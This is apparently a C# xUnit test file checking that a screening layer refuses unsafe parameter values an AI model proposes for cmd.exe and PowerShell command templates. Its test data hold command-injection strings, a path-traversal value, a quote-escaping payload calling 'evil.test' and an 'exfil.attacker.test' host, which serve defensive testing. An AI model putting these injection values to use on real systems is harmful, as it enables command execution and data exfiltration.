using System;
using System.Collections.Generic;
using MissionController.Core;
using MissionController.Core.Models;
using Xunit;

namespace MissionController.Tests;

/// <summary>
/// The gates that let a model TARGET a governed template without letting it compose a command.
///
/// Every test here is written against the property that would be violated, not against the current
/// implementation's shape: a model reading sensor output an attacker may have written is the threat,
/// and the screening contract is the only thing between that output and an argument list.
/// </summary>
public class ProposedParameterScreeningTests
{
    // ------------------------------------------------------------------ gate 1: declared only

    [Fact]
    public void UndeclaredKey_IsRefused_AndNamedInTheRejection()
    {
        var template = HostTemplate();

        var screening = GovernedArgumentBinder.ScreenProposedValues(
            template,
            new Dictionary<string, string> { ["OutputPath"] = "C:/temp/x.txt" },
            EmptyOperatorValues);

        Assert.Empty(screening.Accepted);
        Assert.Contains(screening.Rejections, r => r.Contains("OutputPath") && r.Contains("declares"));
    }

    // ------------------------------------------------------------------ gate 2: the operator wins

    [Fact]
    public void OperatorSuppliedValue_CannotBeChangedByTheModel()
    {
        var template = HostTemplate();
        var operatorValues = new Dictionary<string, string> { ["TargetHost"] = "dc01.corp.local" };

        var screening = GovernedArgumentBinder.ScreenProposedValues(
            template,
            new Dictionary<string, string> { ["TargetHost"] = "exfil.attacker.test" },
            operatorValues);

        Assert.Empty(screening.Accepted);
        Assert.Contains(screening.Rejections, r => r.Contains("operator"));

        // And the value the operator typed is what the command is still built from. Asserting on the
        // bound string rather than on the dictionary is the point: a refusal that still let the value
        // through somewhere else would pass a dictionary assertion and fail the machine.
        string bound = GovernedArgumentBinder.Bind(template, operatorValues);
        Assert.Contains("dc01.corp.local", bound);
        Assert.DoesNotContain("attacker", bound);
    }

    // ------------------------------------------------------------------ gate 3: safe in position

    [Theory]
    // Shell metacharacters in an unquoted position - the classic injection attempt.
    [InlineData("dc02 && whoami")]
    [InlineData("dc02; whoami")]
    [InlineData("dc02|whoami")]
    [InlineData("dc02`whoami`")]
    [InlineData("$(whoami)")]
    // A switch, which would change the tool's own behaviour rather than its target.
    [InlineData("-Recurse")]
    // Newline injection: everything after it would be read as a second statement.
    [InlineData("dc02\nwhoami")]
    // Not a hostname at all, for a field the author declared as Host.
    [InlineData("../../etc/passwd")]
    public void UnsafeHostValue_IsRefused(string proposed)
    {
        var screening = GovernedArgumentBinder.ScreenProposedValues(
            HostTemplate(),
            new Dictionary<string, string> { ["TargetHost"] = proposed },
            EmptyOperatorValues);

        Assert.Empty(screening.Accepted);
        Assert.Single(screening.Rejections);
    }

    [Fact]
    public void ValueThatWouldEscapeAQuotedLiteral_IsRefused()
    {
        // The placeholder sits inside a PowerShell single-quoted literal, so the lethal character is
        // the quote that closes it rather than a space or a pipe.
        var template = PowerShellTemplate("-Command \"Get-Item -Path 'C:/logs/{LogName}'\"");

        var screening = GovernedArgumentBinder.ScreenProposedValues(
            template,
            new Dictionary<string, string> { ["LogName"] = "a'; Invoke-WebRequest evil.test; '" },
            EmptyOperatorValues);

        Assert.Empty(screening.Accepted);
        Assert.Contains(screening.Rejections, r => r.Contains("LogName"));
    }

    [Fact]
    public void SpaceIsAcceptedInsideAQuotedLiteral_ButNotInABarePosition()
    {
        // The same value, the same key, two templates: the only difference is whether the author put
        // the placeholder inside quotes. Screening must read the author's context, not the value.
        var quoted = PowerShellTemplate("-Command \"Get-Item -Path 'C:/logs/{LogName}'\"");
        var bare = PowerShellTemplate("-Command \"Get-Item -Path C:/logs/{LogName}\"");
        var proposal = new Dictionary<string, string> { ["LogName"] = "System Events" };

        Assert.True(GovernedArgumentBinder
            .ScreenProposedValues(quoted, proposal, EmptyOperatorValues).Accepted.ContainsKey("LogName"));

        Assert.Empty(GovernedArgumentBinder
            .ScreenProposedValues(bare, proposal, EmptyOperatorValues).Accepted);
    }

    [Fact]
    public void MultilineField_IsNeverSettable()
    {
        var template = TemplateWith(
            "-Command \"Write-Output '{Notes}'\"",
            new TemplateParameterField("Notes", "Notes", "Operator notes", string.Empty,
                ValueType: TemplateParameterType.Multiline));

        var screening = GovernedArgumentBinder.ScreenProposedValues(
            template,
            new Dictionary<string, string> { ["Notes"] = "anything at all" },
            EmptyOperatorValues);

        Assert.Empty(screening.Accepted);
        Assert.Contains(screening.Rejections, r => r.Contains("Notes"));
    }

    [Theory]
    [InlineData("443", true)]
    [InlineData("not-a-number", false)]
    [InlineData("443 || true", false)]
    public void NumberField_TakesOnlyNumbers(string proposed, bool expectAccepted)
    {
        var template = TemplateWith(
            "/c ping -n {Count} 127.0.0.1",
            new TemplateParameterField("Count", "Count", "Echo count", "4",
                ValueType: TemplateParameterType.Number));

        var screening = GovernedArgumentBinder.ScreenProposedValues(
            template,
            new Dictionary<string, string> { ["Count"] = proposed },
            EmptyOperatorValues);

        Assert.Equal(expectAccepted, screening.Accepted.ContainsKey("Count"));
    }

    // ------------------------------------------------------------------ the accept path

    [Fact]
    public void LegitimateTarget_IsAccepted_AndReachesTheBoundCommand()
    {
        var template = HostTemplate();

        var screening = GovernedArgumentBinder.ScreenProposedValues(
            template,
            new Dictionary<string, string> { ["TargetHost"] = "dc02.corp.local" },
            EmptyOperatorValues);

        Assert.Empty(screening.Rejections);
        Assert.Equal("dc02.corp.local", screening.Accepted["TargetHost"]);

        string bound = GovernedArgumentBinder.Bind(template, screening.Accepted);
        Assert.Contains("dc02.corp.local", bound);
        Assert.DoesNotContain("{TargetHost}", bound);
    }

    /// <summary>
    /// The load-bearing invariant. Screening exists so a bad proposal costs PRECISION (the step runs
    /// on its default) instead of costing the INVESTIGATION (the mission is refused). That only holds
    /// if screening is at least as strict as the binder: anything it accepts, <c>Bind</c> must place
    /// without throwing. If the two policies ever drift apart, this is the test that says so.
    /// </summary>
    [Theory]
    [InlineData("dc02.corp.local")]
    [InlineData("10.0.0.5")]
    [InlineData("[fe80::1]")]
    [InlineData("dc02 && whoami")]
    [InlineData("a'; whoami; '")]
    [InlineData("")]
    [InlineData("-Force")]
    public void WhateverScreeningAccepts_BindAlsoAccepts(string proposed)
    {
        var template = HostTemplate();
        var screening = GovernedArgumentBinder.ScreenProposedValues(
            template,
            new Dictionary<string, string> { ["TargetHost"] = proposed },
            EmptyOperatorValues);

        // Not an assertion that it was accepted - an assertion that IF it was, binding cannot fail.
        var ex = Record.Exception(() => GovernedArgumentBinder.Bind(template, screening.Accepted));
        Assert.Null(ex);
    }

    // ------------------------------------------------------------------ bounds

    [Fact]
    public void AFloodOfProposals_IsBounded_AndSaysSo()
    {
        var proposals = new Dictionary<string, string>();
        for (int i = 0; i < 500; i++)
        {
            proposals[$"Key{i}"] = "value";
        }

        var screening = GovernedArgumentBinder.ScreenProposedValues(
            HostTemplate(), proposals, EmptyOperatorValues);

        Assert.Empty(screening.Accepted);
        // 32 screened and refused as undeclared, plus the one line that says the rest were not read.
        Assert.True(screening.Rejections.Count <= 33,
            $"screening reported {screening.Rejections.Count} rejections for 500 proposals.");
        Assert.Contains(screening.Rejections, r => r.Contains("were not screened"));
    }

    [Fact]
    public void NoProposals_IsNotAnError()
    {
        var none = GovernedArgumentBinder.ScreenProposedValues(HostTemplate(), null, EmptyOperatorValues);
        Assert.Empty(none.Accepted);
        Assert.Empty(none.Rejections);

        var empty = GovernedArgumentBinder.ScreenProposedValues(
            HostTemplate(), new Dictionary<string, string>(), null);
        Assert.Empty(empty.Accepted);
        Assert.Empty(empty.Rejections);
    }

    // ------------------------------------------------------------------ the parser's half

    [Fact]
    public void ParsedDecision_CarriesProposalsOnlyWhenContinuing()
    {
        string carried = """
            ```json
            {"action":"continue","templateId":"t1","reason":"lead","parameters":{"TargetHost":"dc02"}}
            ```
            """;
        var accepted = ReActDecisionContract.Parse(carried, new[] { "t1" });
        Assert.True(accepted.ShouldContinue);
        Assert.Equal("dc02", accepted.Proposals["TargetHost"]);

        string stopping = """
            ```json
            {"action":"stop","templateId":null,"reason":"explained","parameters":{"TargetHost":"dc02"}}
            ```
            """;
        var stopped = ReActDecisionContract.Parse(stopping, new[] { "t1" });
        Assert.False(stopped.ShouldContinue);
        Assert.Empty(stopped.Proposals);
    }

    [Fact]
    public void NonScalarProposalValues_AreSkippedRatherThanStringified()
    {
        // "System.Object[]" arriving as a hostname is a value no human wrote, and flattening one is
        // how a parser invents input. A number and a bool ARE taken, because a port or a switch is a
        // legitimate thing for a model to name.
        string output = """
            ```json
            {"action":"continue","templateId":"t1","reason":"lead","parameters":{
              "Nested":{"a":1},"List":[1,2],"Null":null,"Port":8443,"Recurse":true,"Host":"dc02"}}
            ```
            """;
        var decision = ReActDecisionContract.Parse(output, new[] { "t1" });

        Assert.False(decision.Proposals.ContainsKey("Nested"));
        Assert.False(decision.Proposals.ContainsKey("List"));
        Assert.False(decision.Proposals.ContainsKey("Null"));
        Assert.Equal("8443", decision.Proposals["Port"]);
        Assert.Equal("true", decision.Proposals["Recurse"]);
        Assert.Equal("dc02", decision.Proposals["Host"]);
    }

    [Fact]
    public void MissingParametersObject_YieldsAnEmptyMapRatherThanNull()
    {
        // Callers screen unconditionally; a null here would make that a NullReferenceException on the
        // most common answer the model gives.
        string output = """
            ```json
            {"action":"continue","templateId":"t1","reason":"lead"}
            ```
            """;
        Assert.Empty(ReActDecisionContract.Parse(output, new[] { "t1" }).Proposals);
    }

    // ------------------------------------------------------------------ helpers

    private static readonly Dictionary<string, string> EmptyOperatorValues = new();

    private static SingleToolTemplate HostTemplate() => TemplateWith(
        "/c nltest /server:{TargetHost}",
        new TemplateParameterField("TargetHost", "Target host", "Host to query", "localhost",
            ValueType: TemplateParameterType.Host));

    private static SingleToolTemplate PowerShellTemplate(string argumentsTemplate) => new(
        "ps-template",
        "PowerShell template",
        "Template whose tool is powershell.exe",
        "Diagnostics",
        "claude-haiku-4-5",
        new SingleToolDefinition("tool-ps", "PowerShell", "powershell.exe", argumentsTemplate, new[] { 0 }),
        new EgressRule("api.anthropic.com"),
        "Analyze",
        new[]
        {
            new TemplateParameterField("LogName", "Log name", "Log to read", "Application"),
        },
        new Dictionary<string, string>());

    private static SingleToolTemplate TemplateWith(
        string argumentsTemplate,
        TemplateParameterField field) => new(
        "test-template",
        "Test template",
        "Template under test",
        "Diagnostics",
        "claude-haiku-4-5",
        new SingleToolDefinition(
            "tool-test",
            "Test tool",
            argumentsTemplate.StartsWith("/c", StringComparison.Ordinal) ? "cmd.exe" : "powershell.exe",
            argumentsTemplate,
            new[] { 0 }),
        new EgressRule("api.anthropic.com"),
        "Analyze",
        new[] { field },
        new Dictionary<string, string>());
}
